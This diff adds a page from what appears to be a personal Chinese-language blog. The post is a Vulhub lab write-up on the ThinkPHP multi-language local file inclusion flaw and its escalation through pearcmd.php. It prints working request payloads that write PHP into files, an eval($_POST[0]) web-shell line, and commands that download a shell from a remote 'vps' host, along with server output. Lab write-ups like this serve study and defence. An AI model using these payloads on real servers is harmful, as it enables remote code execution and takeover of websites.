@@ -1,0 +1,119 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Vulhub_Frame</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="ThinkphpThinkPHP 多语言本地文件包含漏洞
+ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。
+虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&amp;#x2F;pear的环境下，可以包含/usr/local/lib/php/pearcmd.php并写入任意文件
+
+
+安装了pear（这样才能有pearcmd.php）
+开启了register_argc_argv
+存在文件包含且可以包含后缀为php的文件且没有open_basedir的限制。
+
+原理pearcmd.php的妙用_register argc argv-CSDN博客
+根据博客，.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Vulhub_Frame</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Thinkphp"><span class="toc-text">Thinkphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-%E5%A4%9A%E8%AF%AD%E8%A8%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">ThinkPHP 多语言本地文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BD%E6%BA%AF"><span class="toc-text">追溯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-text">验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-%E5%86%99%E6%96%87%E4%BB%B6-%E5%BC%80%E5%90%AF%E6%AE%B5%E6%A0%87%E7%AD%BE"><span class="toc-text">exp1:写文件(开启段标签)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-2-%E5%86%99%E6%96%87%E4%BB%B6-%E5%BC%80%E5%90%AF%E6%AE%B5%E6%A0%87%E7%AD%BE"><span class="toc-text">exp1.2:写文件(开启段标签)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp2%EF%BC%9A%E4%B8%8B%E8%BD%BDshell%EF%BC%88%E4%B8%8D%E9%9C%80%E8%A6%81%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="toc-text">exp2：下载shell（不需要短标签）</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Vulhub"><i class="tag post-item-tag">Vulhub</i></a><a href="/tags/Frame"><i class="tag post-item-tag">Frame</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Vulhub_Frame</h1><time class="has-text-grey" datetime="2024-11-12T07:21:00.000Z">2024-11-12</time><article class="mt-2 post-content"><h1 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h1><h2 id="ThinkPHP-多语言本地文件包含漏洞"><a href="#ThinkPHP-多语言本地文件包含漏洞" class="headerlink" title="ThinkPHP 多语言本地文件包含漏洞"></a>ThinkPHP 多语言本地文件包含漏洞</h2><blockquote>
+<p>ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用<code>lang</code>参数来包含任意PHP文件。</p>
+<p>虽然只能包含本地PHP文件，但在开启了<code>register_argc_argv</code>且安装了pcel&#x2F;pear的环境下，可以包含<code>/usr/local/lib/php/pearcmd.php</code>并写入任意文件</p>
+</blockquote>
+<ul>
+<li>安装了pear（这样才能有pearcmd.php）</li>
+<li>开启了<code>register_argc_argv</code></li>
+<li>存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制。</li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">pearcmd.php的妙用_register argc argv-CSDN博客</a></p>
+<p>根据博客，<strong>当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell</strong></p>
+<p>如果目标出网：</p>
+<pre><code>http://localhost/test.php?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php
+</code></pre>
+<p>直接下载shell然后包含</p>
+<p>如果不出网：</p>
+<pre><code>/test.php?+config-create+/&amp;file=/usr/share/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
+</code></pre>
+<p>写入shell然后包含，但是这里不清楚这样为什么能写入</p>
+<p>根据这个博客<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌</a>：</p>
+<pre><code>php pearcmd.php
+==&gt;
+...
+config-create
+</code></pre>
+<blockquote>
+<p>阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<p>所以，我构造出最后的利用数据包如下：</p>
+<pre><code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
+Host: 192.168.1.162:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+</code></pre>
+</blockquote>
+<h3 id="追溯"><a href="#追溯" class="headerlink" title="追溯"></a>追溯</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121042290">利用pearcmd.php从LFI到getshell-CSDN博客</a></p>
+<p>通过研究这一博客，可以得知：</p>
+<ul>
+<li><p><code>pear</code>本身是一个sh程序</p>
+</li>
+<li><p>pearcmd.php中<code>$argv</code>就是通过<code>$_SERVER[&#39;argv&#39;]</code>来获取到的。</p>
+</li>
+<li><pre><code>root@VM-0-6-ubuntu:~/somefile# pear help options
+Options:
+     -v         increase verbosity level (default 1)
+     -q         be quiet, decrease verbosity level
+     -c file    find user configuration in `file&#39;
+     -C file    find system configuration in `file&#39;
+     -d foo=bar set user config variable `foo&#39; to `bar&#39;
+     -D foo=bar set system config variable `foo&#39; to `bar&#39;
+     -G         start in graphical (Gtk) mode
+     -s         store user configuration
+     -S         store system configuration
+     -u foo     unset `foo&#39; in the user configuration
+     -h, -?     display help/usage (this message)
+     -V         version information
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>pear -c /tmp/.feng.php -d man_dir=&lt;?=eval($_POST[0]);?&gt; -s
+pear install -R /tmp http://xxxxxxx/shell.php
+</code></pre>
+</li>
+</ul>
+<p><code>&amp;</code> 在 URL 中的作用是<strong>分隔多个查询参数</strong>。在这个例子中，URL 包含多个用 <code>&amp;</code> 分隔的参数，每个参数都将被传递给 <code>pearcmd.php</code> 脚本</p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ul>
+<li>ThinkPHP 6.0.12</li>
+</ul>
+<p>首先，ThinkPHP多语言特性不是默认开启的，所以我们可以尝试包含<code>public/index.php</code>文件来确认文件包含漏洞是否存在</p>
+<p>如果漏洞存在，则服务器会出错，返回500页面。</p>
+<p>文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：</p>
+<ol>
+<li>PHP环境开启了<code>register_argc_argv</code></li>
+<li>PHP环境安装了pcel&#x2F;pear</li>
+</ol>
+<h4 id="exp1-写文件-开启段标签"><a href="#exp1-写文件-开启段标签" class="headerlink" title="exp1:写文件(开启段标签)"></a>exp1:写文件(开启段标签)</h4><pre><code>/?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>CONFIGURATION (CHANNEL PEAR.PHP.NET): ===================================== Auto-discover new Channels auto_discover Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy PEAR server [DEPRECATED] master_server Default Channel Mirror preferred_mirror Remote Configuration File remote_config PEAR executables directory bin_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear PEAR documentation directory doc_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/docs PHP extension directory ext_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/ext PEAR directory php_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php PEAR Installer cache directory cache_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cache PEAR configuration file cfg_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cfg directory PEAR data directory data_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/data PEAR Installer download download_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/download directory Systems manpage files man_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/man directory PEAR metadata directory metadata_dir PHP CLI/CGI binary php_bin php.ini location php_ini --program-prefix passed to php_prefix PHP&#39;s ./configure --program-suffix passed to php_suffix PHP&#39;s ./configure PEAR Installer temp directory temp_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/temp PEAR test directory test_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/tests PEAR www files directory www_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/www Cache TimeToLive cache_ttl Preferred Package State preferred_state Unix file mask umask Debug Log Level verbose PEAR password (for password maintainers) Signature Handling Program sig_bin Signature Key Directory sig_keydir Signature Key Id sig_keyid Package Signature Type sig_type PEAR username (for username maintainers) User Configuration File Filename /var/www/public/shell.php System Configuration File Filename #no#system#config# Successfully created default configuration file &quot;/var/www/public/shell.php&quot; 
+</code></pre>
+<p>根据末尾看见写入成功</p>
+<p>但是此时直接访问shell.php:</p>
+<pre><code>#PEAR_Config 0.9 a:12:&#123;s:7:&quot;php_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php&quot;;s:8:&quot;data_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/data&quot;;s:7:&quot;www_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:96:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:96:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:99:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:90:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear&quot;;s:7:&quot;man_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/man&quot;;&#125;
+</code></pre>
+<p>可以看到结尾，写入的字符被编码了，可能是浏览器自动编码，抓包写入一下，此时写入成功了</p>
+<h4 id="exp1-2-写文件-开启段标签"><a href="#exp1-2-写文件-开启段标签" class="headerlink" title="exp1.2:写文件(开启段标签)"></a>exp1.2:写文件(开启段标签)</h4><pre><code>?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/.feng.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+
+</code></pre>
+<p>这里为了方便，写入phpinfo()：</p>
+<pre><code>?lang=../../../../../../../../../../../usr/local/lib/php/pearcmd.php&amp;+-c+shell2.php+-d+man_dir=&lt;?php phpinfo();?&gt;+-s+
+</code></pre>
+<p>但是这个paylaod好像有问题，无法复现成功</p>
+<h4 id="exp2：下载shell（不需要短标签）"><a href="#exp2：下载shell（不需要短标签）" class="headerlink" title="exp2：下载shell（不需要短标签）"></a>exp2：下载shell（不需要短标签）</h4><pre><code>pearcmd.php&amp;+install+-R+/tmp+http://vps/hello.php
+</code></pre>
+<p>&#x3D;&#x3D;&gt; </p>
+<pre><code>downloading hello.php ...
+Starting to download hello.php (0 bytes)
+...done: 0 bytes
+could not extract the package.xml file from &quot;/tmp/tmp/pear/download/hello.php&quot;
+Download of &quot;http://172.20.10.4:8000/hello.php&quot; succeeded, but it is not a valid package archive
+Invalid or missing remote package file
+install failed
+
+Warning: unlink(/tmp/tmp/pear/temp/pear1cgS9N): No such file or directory in System.php on line 225
+</code></pre>
+<p>将-R的参数改为<code>./</code>即可通过网站访问<code>/tmp/pear/download/hello.php</code></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/11/14/Vulhub-CMS/" title="Vulhub_CMS"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Vulhub_CMS</span></a><a class="button is-default" href="/2024/11/05/Vulnhub-Middleware/" title="Vulhub_Middleware"><span class="has-text-weight-semibold">Next: Vulhub_Middleware</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
